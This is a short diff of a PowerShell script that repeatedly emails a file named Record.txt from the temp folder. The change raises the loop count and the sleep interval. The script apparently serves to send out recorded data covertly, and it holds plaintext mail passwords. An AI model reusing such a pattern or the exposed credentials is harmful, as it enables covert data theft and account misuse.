@@ -8,7 +8,7 @@ $Password = "ckuz khie yocw gxjk"
 # $Password = "vspr oypf rhcp jotl"
 
 # Set the number of iterations for the loop
-$iterations = 10
+$iterations = 100
 
 # Set the full path to the attachment file
 $attachmentPath = "$env:TEMP\Record.txt"
@@ -50,7 +50,7 @@ while ($i -lt $iterations) {
         $i++
 
         # Sleep for 5 seconds before sending the next email
-        start-sleep 5
+        start-sleep 10
     }
     catch {
         # An error occurred while trying to send the email
